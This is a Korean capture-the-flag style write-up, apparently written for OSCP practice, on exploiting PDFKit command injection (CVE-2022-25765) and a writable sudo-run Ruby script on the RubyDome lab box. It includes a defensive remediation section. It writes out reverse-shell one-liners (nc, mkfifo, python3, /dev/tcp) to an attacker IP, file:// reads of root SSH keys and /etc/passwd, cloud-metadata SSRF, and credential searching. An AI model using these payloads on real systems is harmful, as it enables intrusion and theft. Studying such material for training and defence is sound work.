명령주입이 부분적으로만 통할 때는 **어떤 인용 문맥 안에 들어가 있는가**를 먼저 추론한다. 홑따옴표 안이면 `'`로 탈출해야 하고, 쌍따옴표 안이면 `` ` ``/`$( )`가 답이고, 인용이 없으면 `;`가 통한다.

**(c) base64를 `-w0` 없이 만든다 → 76자 넘는 페이로드만 실패**
짧은 테스트는 성공하고 진짜 페이로드만 실패하므로 원인 추적이 어렵다(2-6).

**(d) `-d`로 보낸다 → 두 군데가 동시에 깨진다**
① base64의 `+` 가 공백이 되어 `base64 -d` 가 "invalid input"을 뱉거나 조용히 쓰레기를 만든다. ② 더 근본적으로 `%20` 도 리터럴 공백으로 디코딩되어 `url_needs_escaping?` 판정이 뒤집히고 백틱이 `%60` 이 된다(2-4). 즉 `-d` 는 이 박스의 중심 메커니즘을 직접 파괴한다.
어느 쪽이든 HTTP는 정상 응답이라 실패가 눈에 안 띈다. `--data-urlencode`를 습관으로 굳혀라.

**(e) `sudo -l`을 보고 GTFOBins의 `ruby -e`를 반사적으로 친다 → 거부**
인자까지 고정된 규칙에서는 통하지 않는다(4-1). 여기서 "sudo는 막혔다"고 결론 내리면 박스가 통째로 막힌다. 다음 수는 GTFOBins가 아니라 `ls -la <대상파일>`이다.

**(f) 페이로드를 스크립트 끝에 append한다 → 아무 일도 안 일어난다**
`sudo ruby app.rb`가 그냥 웹서버로 뜨고 프롬프트가 안 돌아온다. `Ctrl+C`로 나와서 "권한상승 실패"로 판단하기 쉽다. 실제로는 위치만 틀렸다(4-2).
`sudo`로 실행했는데 셸이 안 돌아오고 서버 로그가 뜬다면 그 스크립트는 블로킹 서버다. prepend로 바꾼다.

**(g) 리스너를 안 띄우고 페이로드를 먼저 쏜다**
`bash -i >& /dev/tcp/…` 는 연결 실패 시 그냥 죽는다. 재시도가 없다. 리스너를 먼저 띄우는 순서를 습관으로 굳혀라 — `rd.sh`가 `tmux new-session` 다음 줄에 있는 이유다.

### ⑤ 이 단계에서 실패했다면 다음 후보 경로는 무엇이었나

막다른 길에 몰렸을 때 다음에 뭘 볼지 미리 정해두는 것이 시간을 지킨다. 이 박스의 분기점별 대안은 이렇다.

**A. 백트레이스가 안 나왔다면** (`show_exceptions` 꺼짐 / production 모드)

| 대안 | 근거 |
|---|---|
| PDF 메타데이터 | 정상 요청 한 번으로 `Creator:` 에 렌더러 이름·버전이 나온다. 주입 없이도 백엔드가 드러난다 (`[가정]` — **이 박스에서 실제로 읽어본 기록은 없다.** 1장 참조) |
| 응답 헤더 지문 | `Server: WEBrick/1.7.0 (Ruby/3.0.2)` 만으로도 "Ruby + 개발서버"까지는 확정 |
| 404 본문 지문 | `Sinatra doesn't know this ditty.` → 프레임워크 확정 |
| 기능 기반 추론 | "Ruby + HTML→PDF" 조합이면 사실상 PDFKit 아니면 WickedPDF다. 둘 다 wkhtmltopdf 래퍼이고 둘 다 명령주입 이력이 있다 → 버전을 몰라도 페이로드를 던져보는 것이 더 빠르다 |

버전 확정에 실패해도 이 박스는 막히지 않는다. **기능에서 라이브러리를 역추론**할 수 있기 때문이다.

**B. 명령주입이 안 통했다면** (패치된 `0.8.7.2` 이상이었다면)

2-1의 나머지 세 공격이 그대로 남는다. 우선순위 순으로:

```bash
# ① 로컬 파일 읽기 — 가장 저비용, 즉시 성과
url=file:///etc/passwd
url=file:///home/andrew/app/app.rb        # 앱 소스 자체를 PDF로 받아낸다
url=file:///root/.ssh/id_rsa

# ② SSRF — 내부 서비스 발견
url=http://127.0.0.1:22/                  # 배너가 PDF에 찍히는지
url=http://169.254.169.254/latest/meta-data/   # 클라우드면

# ③ HTML 본문 주입 (앱이 HTML도 받는다면)
<iframe src="file:///etc/passwd" width=1000 height=1000>
```

결과가 PDF로 돌아오는 서비스는 출력 채널이 이미 확보된 것이라, blind로 싸울 필요가 없다. `file://`이 렌더되면 파일 내용이 그림처럼 PDF에 박혀서 돌아온다. [[Hawat]]의 blind SQLi(출력 채널이 없어 시간 기반으로만 싸운 경우)와 정반대 상황이다. **출력 채널의 유무가 공략 난이도를 한 자릿수 바꾼다.**

**C. `sudo -l`이 비어 있었다면**

`groups=…,27(sudo)` 는 남아 있으므로 andrew의 비밀번호를 얻는 순간 끝난다. 그 경우의 탐색 순서:

```bash
grep -rniE 'password|passwd|secret|token|api[_-]?key' /home/andrew /var/www 2>/dev/null
ls -la /home/andrew                       # dotfile·history
cat ~/.bash_history 2>/dev/null
find / -perm -4000 -type f 2>/dev/null    # SUID
getcap -r / 2>/dev/null                   # capabilities
cat /etc/crontab; ls -la /etc/cron.*      # 크론
ps aux --forest                           # root로 도는 프로세스
ss -tlnp                                  # 외부에 안 열린 로컬 서비스
```

### ⑥ 리버스셸이 안 붙으면 무엇을 의심하는가

이 박스는 4444가 그대로 붙었지만, 붙지 않는 경우의 분기 절차를 여기 남긴다. 시험장에서 가장 자주 시간을 태우는 지점이기 때문이다.

| 의심 순서 | 확인 방법 | 대응 |
|---|---|---|
| 1. 리스너가 안 떠 있다 | `tmux capture-pane -t rd -p` / `ss -tlnp \| grep 4444` | 가장 흔한 원인이다. 페이로드보다 리스너가 먼저 |
| 2. 명령 자체가 실행 안 됐다 | `` %20`sleep 10` `` 로 시간 지연 확인 | 지연이 없으면 주입 실패다. 리버스셸 문제가 아니다 (2-4의 `%20` 확인) |
| 3. 아웃바운드 포트 차단 | **nmap 결과로는 판정할 수 없다** — 인바운드 정보이기 때문이다(1장). 주입 채널로 직접 재본다: `` %20`curl -m5 http://KALI/a` `` 를 던지고 Kali에서 `nc -lvnp 80` / `tcpdump -i tun0` 으로 관측 | 안 오면 443·80·53 으로 리스너 재배치. 1024 미만은 `sudo nc` 필요 ([[Hawat]]) |
| 4. `bash`가 없다 / `/dev/tcp` 미지원 | `` %20`which bash nc python3 perl > /tmp/w` `` 후 파일 확인(또는 그 결과를 다시 반출) | `dash`에는 `/dev/tcp`가 없다. `nc -e`·`mkfifo`·`python3`·`perl` 페이로드로 교체 |
| 5. 인코딩이 깨졌다 | base64 문자열의 `+`·개행 확인 | `--data-urlencode` · `base64 -w0` · `echo -n` (2-6) |
| 6. 붙었다가 즉시 끊긴다 | 리스너에 연결 로그만 남고 프롬프트 없음 | 셸이 죽는 것. `bash -c "..."`로 감싸거나 `nohup`/`&`로 분리, 또는 부모 프로세스 종료에 딸려 죽는 문제 |

`/dev/tcp` 없이 쓸 대체 페이로드는 이 정도를 준비해 둔다. 전부 base64로 감싸서 던진다.

```bash
nc -e /bin/bash 10.0.0.1 4444                                   # -e 지원 nc
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4444 >/tmp/f   # -e 없는 nc
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("10.0.0.1",4444));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("/bin/bash")'
perl -e 'use Socket;...'                                        # perl은 거의 항상 있다
```

먼저 무엇이 설치돼 있는지 확인하고 고른다. 되는대로 던지면 원인 분리가 안 된다.

### ⑦ 시간 배분 — 어디서 손절했어야 하는가

실측 소요는 12분이다(6장 ①의 mtime 타임라인). 17:47:50 nmap 종료 → 17:49:41 백트레이스로 CVE 확정(2분) → 17:54:47 익스플로잇 발사 → 17:59:15 마무리. 아래 권장 상한은 그 실측과 별개로, 일반적인 예산 감각을 위해 제시하는 것이다 `[가정]`.

| 단계 | 권장 상한 | 초과 시 판단 |
|---|---|---|
| nmap `-p-` (`--min-rate 5000`) | 3분 | 그대로 진행 |
| 웹 초기 탐색(폼 확인·헤더·의도적 500) | 10분 | 백트레이스가 나왔다면 이 단계에서 이미 CVE가 확정된다 |
| 디렉터리 열거 | 10분 | `X-Cascade: pass`를 봤다면 0분. 아예 시작하지 않는다 |
| CVE 확인 → PoC 조립 | 20분 | `sleep` 검증이 먼저다. 30분이 넘으면 페이로드 인코딩을 의심 |
| 셸 획득 후 `sudo -l`까지 | 5분 | 표준 5개 명령이면 충분 |
| 권한상승 | 15분 | `ls -la` 한 줄로 답이 보이는 유형이다 |

이 박스의 이상적인 총 소요는 1시간 안쪽이고, 실측은 12분이었다. 실용적인 교훈은 **백트레이스 하나가 정찰 2분 만에 CVE를 확정시켰다**는 것이고, 개발 서버 배너를 보고 dirbust를 기다리는 대신 일부러 500을 유발한 판단이 전부였다.

(이전 판본은 이 자리에 *"실제로 시간을 잡아먹은 유일한 구간이 27,800 요청짜리 dirbust였다"* 고 적었다. 파일 시각과 역행한다 — 그 실행분은 root 획득 후에 끝났다. 6장 ① 참조)

---

## 7. OSCP 시험 관점

> [!danger] ⚠️ 시험 금지 도구 — 이 박스에서 쓴 것과 쓰지 말아야 할 것
> | 사용 도구 | 시험 허용 여부 |
> |---|---|
> | `nmap`(NSE 기본 스크립트 포함) | 허용 |
> | `dirb`/`gobuster`/`ffuf` | 허용 (단 이 박스에선 무의미) |
> | `curl` · 직접 작성한 `rd.sh` | 허용. 수동 익스플로잇이므로 문제없다 |
> | `nc` · `rlwrap` · `tmux` · `base64` | 허용 |
> | 공개 PoC 스크립트(exploit-db 등) | 허용 — 다만 읽고 이해한 뒤 쓸 것. 무엇을 보내는지 모르면 실패했을 때 복구가 불가능하다 |
> | Metasploit 모듈 | **1대 한정.** 이 박스처럼 curl 한 줄이면 되는 곳에 그 1회를 소모하지 마라 |
> | AutoRecon · `linpeas`·`LinEnum`·`pspy` | 허용. 열거 전용이라 익스플로잇 단계가 없다. 공식 정의는 *"자동으로 취약점을 발견하고 익스플로잇해 원격 접근에 이르는"* 도구를 금지한다 — 열거 도구는 그 정의에 해당하지 않는다([[_WRITEUP-STANDARD]]) |
> | `sqlmap` · 자동 취약점 스캐너(Nessus·OpenVAS 등) · 탐지와 익스플로잇을 자동으로 묶는 프레임워크 | **금지** |
>
> 수동 대안이 곧 이 노트다. 3장의 `rd.sh`는 그대로 시험장에서 재사용 가능한 자산이고, 어떤 자동 도구도 필요하지 않았다.

1. 일부러 500을 유발해 백트레이스를 뽑아라. 잘못된 파라미터 하나로 gem 전체 버전 목록(`pdfkit-0.8.6`)과 앱 파일명(`app.rb`), 취약 함수 행번호를 동시에 얻었다. `WEBrick`/`WSGIServer`/`Werkzeug` 같은 개발 서버 배너가 보이면 거의 확실하게 통한다.
2. 버전 판정은 독립 근거 2개로 확정한다. 여기서는 ①백트레이스의 `gems/pdfkit-0.8.6` ②rubygems 원본을 받아 39·100행 대조. 배너 하나만 믿고 CVE를 고르면 엉뚱한 익스플로잇에 시간을 태운다. ([[Hub]] · [[Levram]] · [[Astronaut]]와 같은 규율)
3. 정적 서빙이 없는 프레임워크에서 dirbust는 시간 낭비다. Sinatra classic은 정의된 라우트 외에 아무것도 안 준다 — 약 27,800 요청에 0건이었다. 응답 헤더 지문(`X-Cascade: pass`)으로 프레임워크를 먼저 판별하고 전략을 바꾼다.
   정확히는 "돌리지 마라"가 아니라 **"기다리지 마라"** 다. 이 박스는 dirbust를 백그라운드에 던져두고 2분 만에 백트레이스로 CVE를 확정했다(6장 ①). 워드리스트는 공짜로 돌지만 주의는 공짜가 아니다.
4. 사용자 입력이 외부 명령으로 흘러가는 기능을 먼저 찾아라. PDF 변환·이미지 처리·아카이브·`ping`/`whois`/`nslookup` 진단 폼. 이런 기능은 프레임워크 CVE가 아니어도 커스텀 코드에서 그대로 뚫린다.
5. 주입이 성립하는지는 리버스셸이 아니라 `sleep`으로 먼저 확인한다. `` %20`sleep 10` `` 후 응답 시간 비교. 리버스셸은 실패 원인이 다섯 가지(주입 실패·아웃바운드 차단·셸 부재·인코딩 파손·리스너 미가동)라 원인 분리가 안 된다.
6. 인용 문맥을 추론하라. `;`·`|`가 안 먹고 `` ` ``만 먹는다면 그건 필터가 아니라 쌍따옴표 안이라는 뜻이다. 셸 쌍따옴표는 `` ` ``·`$( )`·`$VAR`를 막지 못한다.
   업스트림도 결국 같은 결론에 도달했다. PDFKit 0.8.7.2의 최종 수정이 바로 그 쌍따옴표 래핑을 걷어낸 것이다(2-4). "인용으로 막는다"는 설계는 패치 두 번 만에 폐기됐다.
7. 주입 페이로드는 base64로 감싼다. curl → HTTP → 인터프리터 → 셸을 거치며 인용이 4중으로 중첩된다. `echo <b64>|base64 -d|bash` 한 덩어리로 만들면 따옴표·리다이렉션·공백 문제가 통째로 사라진다. `base64 -w0`과 `echo -n`을 잊지 마라.
8. `--data-urlencode`를 기본값으로 쓴다. 이유는 `+` 가 아니라 `%20` 이다. `-d` 로 보내면 두 가지가 동시에 깨진다 — ① base64의 `+` 가 공백이 되고(폼 인코딩에서 `+` 는 공백), ② **`%20` 이 리터럴 공백으로 디코딩되어 `url_needs_escaping?` 판정이 뒤집히고 백틱이 `%60` 이 된다.** ①은 base64를 쓸 때만 나타나지만 ②는 페이로드 형태와 무관하게 항상 나타나고, 증상이 200 OK + 멀쩡한 PDF라 가장 알아채기 어렵다(3장).
9. 요청이 타임아웃되면 리스너부터 본다. 인라인 리버스셸은 HTTP 응답을 막는다. `HTTP=000`/exit 28은 실패가 아니라 성공의 신호인 경우가 많다. ([[Crane]]에서도 동일)
10. `sudo -l`의 규칙이 좁아도 대상 파일의 권한을 반드시 확인한다. `(ALL) NOPASSWD: /usr/bin/ruby /home/andrew/app/app.rb`는 얼핏 안전해 보이지만, 그 `.rb`가 내 소유면 **사실상 `NOPASSWD: ALL`이다.** sudo 규칙을 보면 반사적으로 `ls -la <대상경로>`를 친다. 스크립트가 참조하는 라이브러리와 설정파일, 상위 디렉터리의 쓰기 권한까지 훑으면 더 좋다.
11. 인자까지 고정된 sudo 규칙에서는 GTFOBins가 안 통한다. `ruby -e`를 붙이는 순간 매치가 깨진다. 그때 공격면은 바이너리가 아니라 그 바이너리가 읽는 데이터다.
12. 주입한 코드의 실행 위치를 고민한다. 블로킹 서버(Sinatra/Flask/Express)를 실행하는 스크립트에 페이로드를 append하면 영원히 도달하지 않는다. prepend해야 한다. `sudo`를 쳤는데 프롬프트가 안 돌아오고 서버 로그가 뜨면 위치가 틀린 것이다.
13. 클라이언트 측 검증(`<input type="url">`)은 방어가 아니다. curl로 직접 POST하면 그만이다.
14. 셸은 끊긴다는 전제로 움직인다. 익스플로잇을 파일로 남기고, 얻은 정보는 즉시 노트에 옮기고, SSH 키로 지속성을 확보한다. (6장 ③)
15. 랩이라도 원본을 백업하고 복구한다. 실전 보고서에서 "무엇을 바꿨고 어떻게 되돌렸는가"는 필수 항목이다. `cp <원본> /tmp/<원본>.bak`을 수정 전에 친다.
    그리고 `cp` 는 기존 파일의 소유자를 바꾸지 않는다. 소유권이 바뀌는 것은 `mv` 나 새 파일 생성이다(4-2). 이 노트가 한때 반대로 적어뒀는데, 파일을 갈아치우는 방법마다 무엇이 보존되는지는 흔적 관리의 기본이고 `ls -l` 한 번이면 확인된다.
16. 셸 출력을 파일로 남겨라. 이 노트의 3장·4장 터미널 블록은 셸이 소멸하면서 원문이 전부 사라져 재구성으로 남았다. `tmux capture-pane -t <세션> -p >> ~/PG/<박스>/shell.log` 한 줄이면 됐다. 얻은 정보를 즉시 밖으로 옮긴다는 규율(14번)에 셸 출력도 포함된다.

---

## 8. 방어 관점

| 결함 | 조치 |
|---|---|
| 사용자 입력이 검증 없이 `PDFKit.new()`로 직행 | 서버 측에서 URL을 파싱·화이트리스트 검증. `URI.parse` 후 scheme(`http`/`https`만)·host(허용 도메인)·셸 메타문자 유무를 거부 기준으로 검사 |
| PDFKit 0.8.6 (CVE-2022-25765) | **`0.8.7.2` 이상으로 업그레이드.** `0.8.7`은 판정 로직만 고치고 쌍따옴표 래핑을 남겨둔 중간 상태이므로 `>= 0.8.7.2`로 고정한다(2-4). `bundle audit`/Dependabot을 CI에 넣어 gem CVE를 자동 감시 |
| 명령을 문자열로 조립해 `IO.popen`에 전달 | 배열 형태(`IO.popen([exe, arg1, arg2])`)로 넘겨 셸을 아예 배제. Python `shell=False`, Node `execFile`, PHP `escapeshellarg`와 같은 원칙 |
| 셸 쌍따옴표를 방어로 착각 | 인용은 방어가 아니다. 인용 대신 인자 분리가 정답이다 |
| 클라이언트 측 `<input type="url">`만 존재 | 서버 측 재검증 필수. 브라우저 검증은 UX이지 보안통제가 아니다 |
| 개발 서버(WEBrick)로 운영 + `show_exceptions` 활성 | 운영은 Puma/Unicorn + 리버스 프록시. `set :show_exceptions, false`, `RACK_ENV=production`. 에러 페이지는 일반 메시지만 노출하고 상세는 서버 로그로 |
| 앱이 일반 사용자 권한이지만 sudo 그룹 소속 계정으로 구동 | 서비스 전용 계정(`nologin` 셸, sudo 그룹 미소속)으로 분리. 웹 프로세스가 뚫려도 sudo 경로가 즉시 열리지 않게 한다 |
| `sudo -l` 규칙의 대상이 사용자 쓰기 가능 | sudo로 실행되는 스크립트는 root 소유에 `0755`(또는 `0644`)여야 한다. 상위 디렉터리도 마찬가지. 이 하나만 고쳤어도 root 상승이 불가능했다 |
| 서비스 실행을 sudo 규칙으로 허용 | systemd 유닛 + `systemctl` 권한 위임(polkit)으로 대체. 인터프리터에 스크립트를 넘기는 sudo 규칙은 원리적으로 안전할 수 없다 |
| wkhtmltopdf가 임의 URL을 서버에서 fetch | 렌더러를 네트워크 격리된 컨테이너에서 실행하고 아웃바운드를 화이트리스트. `--disable-local-file-access`로 `file://` 차단 (SSRF·LFR 동시 완화) |

---

## 9. 참고 자료

- CVE-2022-25765 — PDFKit(Ruby gem) OS Command Injection. 영향 범위 `< 0.8.7.2`, `0.8.7`은 불완전 수정
  - Snyk: https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795
  - 취약 코드 원본: https://github.com/pdfkit/pdfkit/blob/v0.8.6/lib/pdfkit/source.rb (`shell_safe_url` · `url_needs_escaping?`)
  - 중간 수정본 (판정만 고침, 쌍따옴표 잔존): https://github.com/pdfkit/pdfkit/blob/v0.8.7/lib/pdfkit/source.rb
  - 최종 수정본 (`escaped_url`, 쌍따옴표 제거): https://github.com/pdfkit/pdfkit/blob/v0.8.7.2/lib/pdfkit/source.rb
  - 세 버전을 나란히 놓고 봐야 어디가 고쳐졌는지 보인다 — 두 개만 보면 이 노트처럼 수정을 엉뚱한 버전에 귀속시킨다
- CWE-78: OS Command Injection — https://cwe.mitre.org/data/definitions/78.html
- OWASP Top 10 A03:2021 — Injection
- Ruby `IO.popen` 문자열 vs 배열 인자 동작 차이 (문자열이면 `/bin/sh -c` 경유)
- Sinatra classic 모드의 `at_exit` 기동 방식 — 스크립트 말미가 실행 종료 지점이 아니다
- GTFOBins `ruby`: https://gtfobins.github.io/gtfobins/ruby/ — 단, 인자 고정 sudo 규칙에서는 적용 불가(4-1)
- 오프라인 gem 원본 확보: `gem fetch <이름> -v <버전>` + `gem unpack`

## 남긴 흔적

| 항목 | 상태 |
|---|---|
| `/home/andrew/app/app.rb` | 복구 완료 — 백업본으로 `cp` 덮어쓰기 후 `head -2` 로 확인. (`chown andrew:andrew` 도 쳤으나 불필요했다 — `cp` 는 소유자를 바꾸지 않는다. 4-2) |
| `/tmp/app.rb.bak` · `/tmp/p.rb` · `/tmp/n.rb` | 남아 있음 (삭제 기록 없음) — 랩 Stop/Revert로 소멸 |
| `~/app/page.pdf` | 변환 결과물이 앱 작업 디렉터리에 갱신됨 |
| Kali 측 `~/PG/RubyDome/rd.sh` · `pdfkit-0.8.6/` | 로컬 보관 (재사용 자산) |

획득 자격증명: 없음. foothold와 권한상승 모두 비밀번호 없이 성립했다(NOPASSWD 규칙).

## 관련 노트

- [[_WRITEUP-STANDARD]] — 이 노트의 작성 기준
- [[Crane]] — "응답이 성공을 뜻하지 않는다" 동일 패턴 (타임아웃 = 성공)
- [[Levram]] — 개발 서버(`WSGIServer`) 배너로 방향을 잡은 동일 흐름. **그리고 같은 날 같은 적대적 검증에서 같은 실패 모드가 잡힌 짝 노트다** — 소스 인용은 정확하고 터미널 출력은 날조. Levram 쪽이 더 심했다(버전 판정 장 절반이 허구)
- [[Hub]] — 버전 판정 근거 2개 규율 / 서비스가 특권으로 구동되는 대조 사례
- [[Hawat]] — 인용 중첩을 hex 리터럴로 회피, 웹셸 실행 주체 확인
- [[Squid]] · [[Exfiltrated]] — 같은 계열의 인코딩 회피 기법
- [[01. Pentest Foundations]] — RubyDome 항목
